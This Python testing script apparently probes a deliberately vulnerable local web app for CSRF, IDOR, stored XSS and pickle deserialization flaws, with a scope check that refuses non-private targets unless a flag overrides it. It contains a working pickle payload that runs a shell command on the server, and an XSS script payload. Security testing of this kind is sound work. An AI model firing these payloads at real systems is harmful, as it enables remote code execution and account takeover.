"""
Minimal, LLM-free checker for vulnerability classes that don't fit
auto_vuln_scanner.py's model (fuzz one GET param with text payloads,
compare to a baseline). Each class here needs session state, a specific
request shape, or a crafted binary payload instead:

  csrf        Log in, then replay the state-changing request with only
              the session cookie and no CSRF token -- exactly what a
              forged cross-site auto-submitting form could send.
  idor        Log in as a low-privilege user, then request another
              user's object by id using that same valid session -- a
              perfectly normal-looking request, no malicious payload.
  deserialize Craft a pickle byte stream whose __reduce__ runs an
              attacker-chosen callable, POST it, and look for the
              executed command's own output in the response -- direct
              proof code ran server-side, not a guess.
  stored_xss  POST a payload to one endpoint, then GET a *different*
              endpoint later to see if it comes back unescaped -- the
              payload doesn't need to be in the victim's own request at
              all, unlike reflected XSS.

Scope: run only against targets you own/control, e.g. vulnerable_app.py
in this same directory.
"""

from __future__ import annotations

import argparse
import base64
import pickle
import sys
from dataclasses import dataclass
from typing import Callable

import requests

from auto_vuln_scanner import _is_allowed_target


# --------------------------------------------------------------------------
# CSRF
# --------------------------------------------------------------------------


def check_csrf(args: argparse.Namespace) -> tuple[bool, str]:
    s = requests.Session()
    login_resp = s.get(f"{args.url}{args.login_path}", timeout=10)
    if login_resp.status_code != 200:
        return False, f"login failed (status {login_resp.status_code}), cannot test"

    # Forged request: same session cookie, no csrf_token at all -- this is
    # exactly what a cross-site auto-submitting form could produce.
    forged = requests.Session()
    forged.cookies.update(s.cookies)
    resp = forged.post(f"{args.url}{args.transfer_path}", data={"amount": "50"}, timeout=10)

    if resp.status_code == 200 and "Transferred" in resp.text:
        return True, f"forged request succeeded with no CSRF token: {resp.text.strip()}"
    return False, f"forged request was rejected (status {resp.status_code}): {resp.text.strip()}"


# --------------------------------------------------------------------------
# IDOR / BOLA
# --------------------------------------------------------------------------


def check_idor(args: argparse.Namespace) -> tuple[bool, str]:
    s = requests.Session()
    login_resp = s.get(f"{args.url}{args.login_path}", params={"username": args.login_as}, timeout=10)
    if login_resp.status_code != 200:
        return False, f"login as {args.login_as!r} failed (status {login_resp.status_code}), cannot test"

    # Same session (own, valid login), but asking for a different user_id --
    # a normal authenticated request, no malicious payload involved.
    resp = s.get(f"{args.url}{args.account_path}", params={"user_id": args.target_id}, timeout=10)

    if resp.status_code == 200 and f"Account {args.target_id}" in resp.text:
        return True, f"accessed another user's account as {args.login_as!r}: {resp.text.strip()}"
    return False, f"access denied (status {resp.status_code}): {resp.text.strip()}"


# --------------------------------------------------------------------------
# Insecure deserialization (pickle RCE)
# --------------------------------------------------------------------------


class _RCEPayload:
    """Pickling this object embeds an arbitrary-code callable in the
    byte stream; unpickling it (pickle.loads) runs that callable."""

    def __reduce__(self):
        return (eval, ("__import__('subprocess').check_output(['id']).decode()",))


def check_deserialize(args: argparse.Namespace) -> tuple[bool, str]:
    payload = base64.b64encode(pickle.dumps(_RCEPayload()))
    resp = requests.post(f"{args.url}{args.deserialize_path}", data=payload, timeout=10)
    if "uid=" in resp.text:
        return True, f"RCE confirmed, command output leaked via deserialization: {resp.text.strip()}"
    return False, f"deserialization did not execute attacker code (status {resp.status_code}): {resp.text.strip()}"


# --------------------------------------------------------------------------
# Stored XSS: post once, read back later from a different endpoint
# --------------------------------------------------------------------------

STORED_XSS_PAYLOAD = "<script>alert('stored-xss')</script>"


def check_stored_xss(args: argparse.Namespace) -> tuple[bool, str]:
    post_resp = requests.post(f"{args.url}{args.post_path}", data={"text": STORED_XSS_PAYLOAD}, timeout=10)
    if post_resp.status_code != 200:
        return False, f"posting the review failed (status {post_resp.status_code}), cannot test"

    get_resp = requests.get(f"{args.url}{args.list_path}", timeout=10)
    if STORED_XSS_PAYLOAD in get_resp.text:
        return True, f"stored payload came back unescaped from {args.list_path}"
    return False, f"stored payload was escaped or absent (status {get_resp.status_code})"


# --------------------------------------------------------------------------
# Registry: add a new session/payload-shaped class here
# --------------------------------------------------------------------------


@dataclass
class SessionVulnClass:
    check: Callable[[argparse.Namespace], tuple[bool, str]]
    vulnerable_label: str
    safe_label: str


CLASSES: dict[str, SessionVulnClass] = {
    "csrf": SessionVulnClass(check_csrf, "VULNERABLE", "Not vulnerable (CSRF token enforced)"),
    "idor": SessionVulnClass(check_idor, "VULNERABLE", "Not vulnerable (ownership enforced)"),
    "deserialize": SessionVulnClass(check_deserialize, "VULNERABLE", "Not vulnerable"),
    "stored_xss": SessionVulnClass(check_stored_xss, "VULNERABLE", "Not vulnerable (escaped on render)"),
}


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--class", dest="vuln_class_name", required=True, choices=sorted(CLASSES))
    parser.add_argument("--url", required=True, help="base URL, e.g. http://127.0.0.1:5000")
    parser.add_argument("--login-path", default=None, help="csrf/idor: login endpoint path")
    parser.add_argument("--transfer-path", default="/csrf_transfer", help="csrf: state-changing endpoint path")
    parser.add_argument("--account-path", default="/idor_account", help="idor: account-lookup endpoint path")
    parser.add_argument("--login-as", default="alice", help="idor: the low-privilege user to log in as")
    parser.add_argument("--target-id", type=int, default=3, help="idor: the other user's id to try to access")
    parser.add_argument(
        "--deserialize-path", default="/deserialize", help="deserialize: the unpickling endpoint path"
    )
    parser.add_argument("--post-path", default="/review", help="stored_xss: the endpoint to POST the payload to")
    parser.add_argument("--list-path", default="/reviews", help="stored_xss: the endpoint to GET and check")
    parser.add_argument(
        "--i-own-this-target",
        action="store_true",
        help="override the localhost/RFC1918-only scope check",
    )
    args = parser.parse_args()

    if args.login_path is None:
        args.login_path = "/csrf_login" if args.vuln_class_name == "csrf" else "/idor_login"

    scan_url = args.url if args.vuln_class_name != "deserialize" else f"{args.url}{args.deserialize_path}"
    if not args.i_own_this_target:
        allowed, reason = _is_allowed_target(scan_url)
        if not allowed:
            print(f"Refusing to scan: {reason}", file=sys.stderr)
            return 2

    vuln_class = CLASSES[args.vuln_class_name]
    print(f"Target: {args.url}")
    print(f"Class: {args.vuln_class_name}")
    print("-" * 60)

    vulnerable, detail = vuln_class.check(args)
    if vulnerable:
        print(f"{vuln_class.vulnerable_label}: {detail}")
        return 1

    print(f"{vuln_class.safe_label}: {detail}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
